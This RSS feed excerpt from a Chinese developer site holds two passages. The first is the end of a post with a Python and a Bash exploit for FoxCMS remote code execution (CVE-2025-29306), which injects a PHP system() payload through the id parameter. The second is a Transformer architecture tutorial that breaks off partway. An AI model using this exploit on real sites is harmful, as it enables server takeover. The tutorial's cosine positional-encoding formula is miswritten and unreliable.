        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Parsing error: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Usage: %s &lt;target_url&gt; &lt;command&gt;"</span> % sys.argv[<span class="hljs-number">0</span>])
        sys.exit(<span class="hljs-number">1</span>)

    target = sys.argv[<span class="hljs-number">1</span>]
    cmd = sys.argv[<span class="hljs-number">2</span>]

    <span class="hljs-keyword">if</span> exploit(target, cmd):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] Target is VULNERABLE to CVE-2025-29306!"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] Exploit failed or target not vulnerable."</span>)
    sys.exit(<span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-10">Bash 版本核心代码</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-function"><span class="hljs-title">banner</span></span>() {
<span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">'EOF'</span>

 ██████╗  ██╗       █████╗   ██████╗ ██╗  ██╗  █████╗  ███████╗ ██╗  ██╗ 
 ██╔══██╗ ██║      ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██╔══██╗ ██╔════╝ ██║  ██║ 
 ██████╔╝ ██║      ███████║ ██║      █████╔╝  ███████║ ███████╗ ███████║ 
 ██╔══██╗ ██║      ██╔══██║ ██║      ██╔═██╗  ██╔══██║ ╚════██║ ██╔══██║ 
 ██████╔╝ ███████╗ ██║  ██║ ╚██████╗ ██║  ██╗ ██║  ██║ ███████║ ██║  ██║ 
 ╚═════╝  ╚══════╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚═╝  ╚═╝
                    
            FoxCMS Remote Code Execution (CVE-2025-29306)
                    
EOF

}

<span class="hljs-comment"># 调用横幅函数</span>
banner

<span class="hljs-built_in">set</span> -e

<span class="hljs-comment"># 检查参数数量是否正确</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$#</span>"</span> -ne 2 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">printf</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$0</span> &lt;url&gt; &lt;command&gt;"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

TARGET=<span class="hljs-variable">$1</span>

<span class="hljs-comment"># 编码载荷</span>
ENCODED_CMD=$(python3 -c <span class="hljs-string">"import urllib.parse; print(urllib.parse.quote('\${@print_r(@system(\"<span class="hljs-variable">$2</span>\"))}'))"</span>)
FULL_URL=<span class="hljs-string">"<span class="hljs-variable">${TARGET}</span>?id=<span class="hljs-variable">${ENCODED_CMD}</span>"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"[*] Sending RCE payload: <span class="hljs-variable">$2</span>"</span>
HTML=$(curl -s <span class="hljs-string">"<span class="hljs-variable">$FULL_URL</span>"</span>)

<span class="hljs-comment"># 使用xmllint从已知XPath位置提取&lt;ul&gt;内容</span>
UL_CONTENT=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$HTML</span>"</span> | xmllint --html --xpath <span class="hljs-string">"/html/body/header/div[1]/div[2]/div[1]/ul"</span> - 2&gt;/dev/null)

<span class="hljs-comment"># 去除标签，清理输出</span>
CLEANED=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$UL_CONTENT</span>"</span> | sed <span class="hljs-string">'s/&lt;[^&gt;]*&gt;//g'</span> | sed <span class="hljs-string">'/^$/d'</span> | sed <span class="hljs-string">'s/^[[:space:]]*//'</span>)

<span class="hljs-built_in">echo</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"[+] Command Output:"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$CLEANED</span>"</span>
</code></pre>
<p>6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcANCl1LoX+DdxvlKlOyiHl/4</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIGC-Transformer神经网络架构]]></title>    <link>https://juejin.cn/post/7591871204569071642</link>    <guid>https://juejin.cn/post/7591871204569071642</guid>    <pubDate>2026-01-06T07:59:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591871204569071642" data-draft-id="7591871204569038874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIGC-Transformer神经网络架构"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-06T07:59:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿俊C"/> <meta itemprop="url" content="https://juejin.cn/user/1371817509650552"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIGC-Transformer神经网络架构
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1371817509650552/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿俊C
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:59:22.000Z" title="Tue Jan 06 2026 07:59:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Transformer 是一种完全基于注意力机制的神经网络架构，放弃了传统的循环和卷积结构，在机器翻译等序列到序列任务中表现出色，并成为当今大语言模型（如 GPT、BERT）的基石。</p>
<p>我们以最经典的 <strong>序列到序列任务</strong>（如机器翻译：将英文“I love you”翻译成中文“我爱你”）为例，讲解其完整工作流。</p>
<h4 data-id="heading-0">核心思想</h4>
<p>Transformer 的核心思想是：<strong>通过“自注意力”机制，让序列中的每个元素都能直接与序列中的所有其他元素进行交互，从而捕捉全局的上下文依赖关系。</strong></p>
<hr/>
<h4 data-id="heading-1">整体架构图景</h4>
<p>Transformer 采用 <strong>编码器-解码器</strong> 架构。</p>
<ul>
<li><strong>编码器</strong>：负责理解和抽象化输入序列的信息，将其转化为一组富含上下文信息的“中间表示”。</li>
<li><strong>解码器</strong>：基于编码器的输出和之前已生成的输出，自回归地（一个接一个）生成目标序列。</li>
</ul>
<p>一个标准的 Transformer 模型由 <strong>N 个（通常 N=6）相同的编码器层堆叠而成</strong>，和 <strong>N 个相同的解码器层堆叠而成</strong>。</p>
<hr/>
<h4 data-id="heading-2">第一阶段：输入处理与嵌入</h4>
<h5 data-id="heading-3">1. 词元化与嵌入</h5>
<ul>
<li>
<p><strong>输入</strong>：原始文本序列（如 “I love you”）。</p>
</li>
<li>
<p><strong>步骤</strong>：</p>
<ul>
<li><strong>分词</strong>：将句子分割成词元（Token），例如 <code>["I", "love", "you"]</code>。</li>
<li><strong>嵌入查找</strong>：每个词元通过一个可学习的 <strong>嵌入矩阵</strong> 被转换成一个固定维度的向量（如 512 维）。这个向量称为 <strong>词嵌入</strong>，它试图在向量空间中编码该词元的语义信息。</li>
</ul>
</li>
<li>
<p><strong>输出</strong>：一个向量序列，维度为 <code>[序列长度, 模型维度]</code>。</p>
</li>
</ul>
<h5 data-id="heading-4">2. 位置编码</h5>
<ul>
<li>
<p><strong>问题</strong>：自注意力机制本身是“排列不变”的，它没有内置的顺序概念。<code>“A 打了 B”</code> 和 <code>“B 打了 A”</code> 的词嵌入是一样的，但含义截然不同。</p>
</li>
<li>
<p><strong>解决方案</strong>：<strong>位置编码</strong>。</p>
<ul>
<li>为序列中的每个位置（第1个词，第2个词…）计算一个独一无二的、固定或可学习的向量。</li>
<li>这个位置向量的维度与词嵌入相同。</li>
<li><strong>关键操作</strong>：将 <strong>词嵌入向量</strong> 和 <strong>位置编码向量</strong> <strong>逐元素相加</strong>。</li>
</ul>
</li>
<li>
<p><strong>结果</strong>：得到的向量既包含了词的语义信息，也包含了其在序列中的绝对和相对位置信息。</p>
</li>
</ul>
<p><strong>至此，输入序列被转换为一个包含语义和位置信息的向量序列，准备送入编码器。</strong></p>
<hr/>
<h4 data-id="heading-5">第二阶段：编码器处理</h4>
<p>编码器层是 Transformer 的引擎，每个编码器层结构完全相同，包含两个核心子层：</p>
<h5 data-id="heading-6">子层 1：多头自注意力机制</h5>
<p>这是 Transformer 的灵魂。</p>
<ul>
<li>
<p><strong>目的</strong>：让序列中的每个词都能“关注”序列中的所有其他词，从而基于整个上下文来更新自己的表示。</p>
</li>
<li>
<p><strong>过程</strong>：</p>
<ol>
<li>
<p><strong>线性投影</strong>：对于每个位置的输入向量，通过三组不同的权重矩阵，并行地生成三组向量：<strong>查询向量</strong>、<strong>键向量</strong>、<strong>值向量</strong>。</p>
</li>
<li>
<p><strong>“多头”</strong> ：将模型维度分割成多个“头”（例如 8 个头，每个头维度为 64）。在每个头上独立地进行注意力计算。这允许模型在不同的表示子空间中并行地关注不同方面的信息（例如语法、语义、指代关系）。</p>
</li>
<li>
<p><strong>缩放点积注意力计算</strong>（在每个头上）：</p>
<ul>
<li><strong>匹配</strong>：计算当前词（查询 Q）与序列中所有词（键 K）的相似度得分（点积）。<code>相似度 = Q · K^T</code></li>
<li><strong>缩放</strong>：将得分除以键向量维度的平方根，使训练更稳定。</li>
<li><strong>归一化</strong>：通过 Softmax 函数将相似度得分转换为概率分布（注意力权重），权重之和为 1。</li>
<li><strong>加权求和</strong>：用得到的注意力权重对序列中所有词的 <strong>值向量</strong> 进行加权求和，得到当前词在该注意力头下的新表示。<strong>权重高的值向量对结果贡献大。</strong></li>
</ul>
</li>
<li>
<p><strong>合并</strong>：将所有注意力头的输出拼接起来，并通过一个线性层进行融合。</p>
</li>
</ol>
</li>
<li>
<p><strong>输出</strong>：每个词的新向量，都融合了序列中所有其他词的相关信息。</p>
</li>
</ul>
<h5 data-id="heading-7">子层 2：前馈神经网络</h5>
<ul>
<li><strong>目的</strong>：对自注意力层的输出进行进一步的非线性变换和空间映射。</li>
<li><strong>结构</strong>：一个简单的两层全连接网络，通常中间层的维度更大（如 2048 维），使用 ReLU 激活函数。</li>
<li><strong>作用</strong>：为模型增加非线性能力和表达能力。</li>
</ul>
<h5 data-id="heading-8">残差连接与层归一化</h5>
<ul>
<li>
<p><strong>每个子层</strong>（自注意力、前馈网络）都被一个 <strong>残差连接</strong> 和 <strong>层归一化</strong> 所包裹。</p>
</li>
<li>
<p><strong>流程</strong>：<code>输出 = LayerNorm(子层输入 + 子层函数(子层输入))</code></p>
</li>
<li>
<p><strong>作用</strong>：</p>
<ul>
<li><strong>残差连接</strong>：缓解深层网络中的梯度消失问题，使模型更容易训练。</li>
<li><strong>层归一化</strong>：稳定每一层的输入分布，加速训练。</li>
</ul>
</li>
</ul>
<p><strong>经过 N 个编码器层的逐层处理后，输入序列被转化为一组高度精炼、富含全局上下文信息的“记忆”或“上下文向量”。这组向量将传递给解码器。</strong></p>
<hr/>
<h4 data-id="heading-9">第三阶段：解码器处理</h4>
<p>解码器也是自回归的，它一次生成一个词元。每个解码器层包含 <strong>三个</strong> 核心子层。</p>
<h5 data-id="heading-10">子层 1：掩码多头自注意力</h5>
<ul>
<li><strong>目的</strong>：让解码器在生成当前词时，只能“看到”它 <strong>之前</strong> 已经生成的词（这是自回归生成的要求），而不能看到未来的词。</li>
<li><strong>实现</strong>：在计算注意力权重时，使用一个 <strong>因果掩码</strong>。这是一个上三角矩阵，将未来位置的注意力权重设置为负无穷，这样在 Softmax 之后，未来位置的权重就变成了 0。</li>
</ul>
<h5 data-id="heading-11">子层 2：编码器-解码器注意力（交叉注意力）</h5>
<ul>
<li>
<p><strong>目的</strong>：这是连接编码器和解码器的桥梁。它让解码器在生成当前词时，能够“询问”编码器：“基于我目前生成的上下文，源序列的哪些部分是相关的？”</p>
</li>
<li>
<p><strong>过程</strong>：</p>
<ul>
<li><strong>Q（查询）</strong>  来自解码器上一层的输出。</li>
<li><strong>K（键）和 V（值）</strong>  来自 <strong>最后一个编码器层的输出</strong>。</li>
<li>计算解码器当前状态（Q）与整个编码器输出序列（K）的相似度，得到注意力权重，然后用这些权重对编码器的值向量（V）进行加权求和。</li>
</ul>
</li>
<li>
<p><strong>结果</strong>：解码器将编码器提供的源序列信息，动态地、有选择地整合到自己的生成过程中。</p>
</li>
</ul>
<h5 data-id="heading-12">子层 3：前馈神经网络</h5>
<ul>
<li>与编码器中的前馈网络完全相同。</li>
</ul>
<p><strong>同样，每个子层周围都有残差连接和层归一化。</strong></p>
<p><strong>经过 N 个解码器层的处理后，在最后一个解码器层的顶部，会输出一个向量序列（每个目标词位置对应一个向量）。</strong></p>
<hr/>
<h4 data-id="heading-13">第四阶段：输出生成</h4>
<ol>
<li>
<p><strong>线性投影</strong>：将最后一个解码器层输出的每个位置的向量，通过一个可学习的线性层，投影到 <strong>目标语言词表大小</strong> 的维度。</p>
</li>
<li>
<p><strong>Softmax</strong>：对线性层的输出应用 Softmax 函数，将其转换为一个概率分布。这个分布表示在当前位置，生成词表中每个词的概率。</p>
</li>
<li>
<p><strong>自回归生成</strong>：</p>
<ul>
<li><strong>训练时</strong>：我们已知完整的目标序列（<code>“&lt;SOS&gt; 我 爱 你 &lt;EOS&gt;”</code>）。解码器会并行地处理整个目标序列（使用掩码），并试图预测下一个词。损失函数（如交叉熵）通过比较预测分布和真实的下一个词来计算。</li>
<li><strong>推理时</strong>：<br/>
a. 从起始符 <code>&lt;SOS&gt;</code> 开始。<br/>
b. 将当前已生成的序列送入解码器，得到下一个词的概率分布。<br/>
c. 通常采用 <strong>束搜索</strong> 或 <strong>贪心采样</strong> 等策略，选择下一个词（例如选择概率最高的词“我”）。<br/>
d. 将新生成的词追加到序列末尾，重复步骤 b-c，直到生成结束符 <code>&lt;EOS&gt;</code>。</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-14">工作流总结</h4>
<ol>
<li>
<p><strong>输入预处理</strong>：<code>文本</code> -&gt; <code>词元化</code> -&gt; <code>词嵌入</code> + <code>位置编码</code> = 带位置的输入向量。</p>
</li>
<li>
<p><strong>编码器堆栈</strong>（N层）：每层对输入进行 <strong>多头自注意力</strong>（捕捉上下文）和 <strong>前馈变换</strong>，用 <strong>残差连接和层归一化</strong> 稳定训练。输出 <strong>上下文记忆</strong>。</p>
</li>
<li>
<p><strong>解码器堆栈</strong>（N层，自回归）：</p>
<ul>
<li><strong>掩码自注意力</strong>：关注已生成的部分。</li>
<li><strong>交叉注意力</strong>：查询编码器的上下文记忆，获取相关信息。</li>
<li><strong>前馈变换</strong>：进一步处理信息。</li>
<li>每层同样使用 <strong>残差连接和层归一化</strong>。</li>
</ul>
</li>
<li>
<p><strong>输出层</strong>：<code>解码器输出</code> -&gt; <code>线性投影</code> -&gt; <code>Softmax</code> -&gt; <code>下一个词的概率分布</code> -&gt; <code>自回归生成完整序列</code>。</p>
</li>
</ol>
<h4 data-id="heading-15">关键创新与优势</h4>
<ul>
<li><strong>并行化</strong>：与 RNN 的串行处理不同，Transformer 对序列所有位置的注意力计算可以完全并行，极大提高了训练速度。</li>
<li><strong>长程依赖</strong>：自注意力机制允许任意两个位置直接交互，无论距离多远，有效解决了 RNN 的长程依赖衰减问题。</li>
<li><strong>可扩展性</strong>：模块化的层堆叠结构，使其能够通过增加层数、维度等轻松扩展成超大模型（如 GPT-3、PaLM）。</li>
</ul>
<p>希望这个详细的流程能帮助你清晰地理解 Transformer 的内部工作机制。</p>
<p>生成md文档</p>
<p>我们按照Transformer的整体工作流程，将上述详细讲解整理成Markdown文档。注意，由于Markdown不支持复杂的图表，我们将用文字描述和简单的代码块来示意关键步骤。对于复杂的数学公式，我们将使用LaTeX格式。</p>
<p>注意：由于内容较长，我们将分章节进行整理。</p>
<h2 data-id="heading-16">Transformer 模型完整工作流程详解</h2>
<h3 data-id="heading-17">概述</h3>
<p>Transformer 是一种完全基于注意力机制的神经网络架构，由 Vaswani 等人在 2017 年的论文《Attention Is All You Need》中提出。它放弃了传统的循环神经网络和卷积神经网络，在序列到序列任务中表现出色，并成为当今大语言模型的基石。</p>
<h3 data-id="heading-18">核心架构图</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/946717b7606247f79fb28377e5e8a89d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5L-KQw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768291162&amp;x-signature=Q%2FpRWCP8PV4ZznfYXAVDQuhY0so%3D" alt="架构图.png" loading="lazy"/></p>
<h3 data-id="heading-19">一、输入处理阶段</h3>
<h4 data-id="heading-20">1.1 词元化与嵌入</h4>
<h5 data-id="heading-21">流程</h5>
<p>text</p>
<pre><code class="hljs">原始文本 → 分词 → 词嵌入查找 → 词向量序列
</code></pre>
<h5 data-id="heading-22">详细步骤</h5>
<p><strong>1. 分词（Tokenization）</strong></p>
<ul>
<li>将输入文本分割成有意义的单元</li>
<li>方法：BPE、WordPiece、SentencePiece 等</li>
<li>示例：<code>"I love you"</code> → <code>["I", "love", "you"]</code></li>
</ul>
<p><strong>2. 词嵌入（Word Embedding）</strong></p>
<ul>
<li>
<p>通过可学习的嵌入矩阵将词元映射为向量</p>
</li>
<li>
<p>维度：通常为 512、768 或 1024 维</p>
</li>
<li>
<p>数学表示：</p>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini">E ∈ ℝ^(V×d)  <span class="hljs-comment"># 嵌入矩阵，V=词表大小，d=模型维度</span>
<span class="hljs-attr">X_embed</span> = E[token_ids]  <span class="hljs-comment"># 形状: [batch_size, seq_len, d_model]</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-23">1.2 位置编码</h4>
<h5 data-id="heading-24">目的</h5>
<p>为模型提供序列顺序信息，因为自注意力机制本身是位置无关的。</p>
<h5 data-id="heading-25">实现方式</h5>
<p><strong>1. 正弦余弦位置编码（原始 Transformer）</strong></p>
<p>python</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 公式</span>
PE(<span class="hljs-keyword">pos</span>, <span class="hljs-number">2</span>i) = <span class="hljs-keyword">sin</span>(<span class="hljs-keyword">pos</span> / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i/d_model))
PE(<span class="hljs-keyword">pos</span>, <span class="hljs-number">2</span>i+<span class="hljs-number">1</span>) = <span class="hljs-keyword">cos</span>(<span class="hljs-keyword">pos</span> / <span class="hljs-number">10000</span>^(<span class="hljs-number">2</span>i+<span class="hljs-number">1</span>/d_model))

<span class="hljs-comment"># 其中：</span>
<span class="hljs-comment"># - pos: 位置索引（0, 1, 2, ...）</span>
<span class="hljs-comment"># - i: 维度索引（0 ≤ i &lt; d_model/2）</span>
<span class="hljs-comment"># - d_model: 模型维度</span>
</code></pre>
<p><strong>2. 可学习位置编码（如 BERT）</strong></p>
<ul>
<li>为每个位置学习一个独立的嵌入向量</li>
<li>适用于固定或有限的最大序列长度</li>
</ul>
<h5 data-id="heading-26">最终输入表示</h5>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini">输入 = 词嵌入 + 位置编码
<span class="hljs-attr">X</span> = X_embed + PE
</code></pre>
<h3 data-id="heading-27">二、编码器架构</h3>
<p>编码器由 N 个相同的层堆叠而成（通常 N=6）。</p>
<h4 data-id="heading-28">2.1 单编码器层结构</h4>
<p>text</p>
<pre><code class="hljs language-sql" lang="sql">输入
    ↓
多头自注意力层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm（残差连接 <span class="hljs-operator">+</span> 层归一化）
    ↓
前馈神经网络层
    ↓
<span class="hljs-keyword">Add</span> <span class="hljs-operator">&amp;</span> Norm（残差连接 <span class="hljs-operator">+</span> 层归一化）
    ↓
输出
</code></pre>
<h4 data-id="heading-29">2.2 多头自注意力机制</h4>
<h5 data-id="heading-30">计算流程</h5>
<p><strong>1. 线性投影生成 Q、K、V</strong></p>
<p>text</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">Q</span> = X · W_Q  <span class="hljs-comment"># 查询矩阵</span>
<span class="hljs-attr">K</span> = X · W_K  <span class="hljs-comment"># 键矩阵</span>
<span class="hljs-attr">V</span> = X · W_V  <span class="hljs-comment"># 值矩阵</span>
</code></pre>
<p><strong>2. 分割成多个头</strong></p>
<p>text</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 原始维度: [batch_size, seq_len, d_model]</span>
<span class="hljs-comment"># 分割后: [batch_size, num_heads, seq_len, d_k]</span>
<span class="hljs-comment"># 其中 d_k = d_model / num_heads</span>
</code></pre>
<p><strong>3. 缩放点积注意力计算</strong></p>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini">def scaled_dot_product_attention(Q, K, V, <span class="hljs-attr">mask</span>=None):
    <span class="hljs-comment"># 计算注意力分数</span>
    <span class="hljs-attr">scores</span> = torch.matmul(Q, K.transpose(-<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>)) / sqrt(d_k)
    
    <span class="hljs-comment"># 应用掩码（如果需要）</span>
    if mask is not None:
        <span class="hljs-attr">scores</span> = scores.masked_fill(mask == <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>e9)
    
    <span class="hljs-comment"># Softmax 归一化</span>
    <span class="hljs-attr">attention_weights</span> = F.softmax(scores, dim=-<span class="hljs-number">1</span>)
    
    <span class="hljs-comment"># 加权求和</span>
    <span class="hljs-attr">output</span> = torch.matmul(attention_weights, V)
    return output, attention_weights
</code></pre>
<p><strong>4. 多头合并</strong></p>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 1. 每个头独立计算注意力</span>
<span class="hljs-attr">head_i</span> = attention(Q_i, K_i, V_i)

<span class="hljs-comment"># 2. 拼接所有头</span>
<span class="hljs-attr">multi_head</span> = concatenate(head_1, head_2, ..., head_h)

<span class="hljs-comment"># 3. 线性投影</span>
<span class="hljs-attr">output</span> = multi_head · W_O
</code></pre>
<h4 data-id="heading-31">2.3 前馈神经网络</h4>
<h5 data-id="heading-32">结构</h5>
<p>text</p>
<pre><code class="hljs">输入 → 线性层（扩大维度） → ReLU激活 → 线性层（恢复维度） → 输出
</code></pre>
<h5 data-id="heading-33">数学表示</h5>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">FFN</span>(x) = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, xW_1 + b_1)W_2 + b_2
</code></pre>
<p>其中：</p>
<ul>
<li><code>W_1 ∈ ℝ^(d_model×d_ff)</code>，<code>d_ff</code> 通常为 <code>4×d_model</code></li>
<li><code>W_2 ∈ ℝ^(d_ff×d_model)</code></li>
</ul>
<h4 data-id="heading-34">2.4 残差连接与层归一化</h4>
<h5 data-id="heading-35">公式</h5>
<p>text</p>
<pre><code class="hljs language-scss" lang="scss">子层输出 = <span class="hljs-built_in">LayerNorm</span>(x + Sublayer(x))
</code></pre>
<h5 data-id="heading-36">作用</h5>
<ol>
<li><strong>残差连接</strong>：缓解梯度消失，使深层网络易于训练</li>
<li><strong>层归一化</strong>：稳定激活值分布，加速收敛</li>
</ol>
<h3 data-id="heading-37">三、解码器架构</h3>
<p>解码器也由 N 个相同的层堆叠而成。</p>
<h4 data-id="heading-38">3.1 单解码器层结构</h4>
